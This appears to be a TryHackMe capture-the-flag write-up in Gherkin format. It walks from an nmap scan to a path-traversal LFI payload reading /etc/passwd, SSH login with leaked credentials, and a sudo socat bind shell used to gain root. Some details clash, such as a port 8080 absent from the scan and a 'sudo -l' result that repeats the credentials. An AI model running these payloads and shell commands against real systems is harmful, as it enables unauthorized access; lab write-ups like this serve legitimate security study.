## Version 2.0
## language: en

Feature:
  Site:
    TryHackMe
  Category:
    CTF
  User:
    Ar4m1r3z
  Goal:
    Escalate privileges to get two flags that are root and user.

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1      |
    | Firefox Quantum | 68.2Oesr    |
    | Nmap            | 7.80        |
    | Socat           | 1.7.3.4     |
  Machine information:
    Given I am accessing the machine 10.10.59.190
    And is running on port 80

  Scenario: Information gathering
    Given that I run the following Nmap command
    """
    $ nmap -sV 10.10.59.190
    """
    Then I get the output
    """
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
    80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
    """
    Then I can see that it has a port 8080
    And is using server HTTP

  Scenario: Success: Flag User
    Given I have a website
    When I decide to go to port 80
    Then I see have a spa
    When there are 2 items and they are LFI and RFI
    Then I click on the LFI button
    And I see have a description of what LFI is.
    When I realize the URL and it's this
    """
    http://10.10.59.190/article?name=lfiattack
    """
    Then I see that it has a parameter that I can use to try to do an LFI
    """
    http://10.10.59.190/article?name=../../../../../../etc/passwd
    """
    When I see in "/etc/passswd" that there is a username and password
    """
    falconfeast:rootpassword
    """
    Then I test those credentials at SSH and it work
    And I can get the user flag

  Scenario: Success: Flag Root
    Given I'm still at the victim's SSH
    When I run the "sudo -l" to see which one I can run
    So I see that this is the result
    """
    falconfeast:rootpassword
    """
    When I Google an exploit I can use for the socat
    So I found one and I have to put this instruction first
    And it's the victim's SSH this way
    """
    $ sudo socat TCP4-LISTEN:1234,reusaddr EXEC:"/bin/sh"
    """
    When I have the SSH's instruction about the victim
    Then in my Kali I execute an instruction to listen to the victim's port
    """
    $ sudo socat - TCP4:10.10.59.190:1234
    """
    And I'm already "root" and I can take the flag out
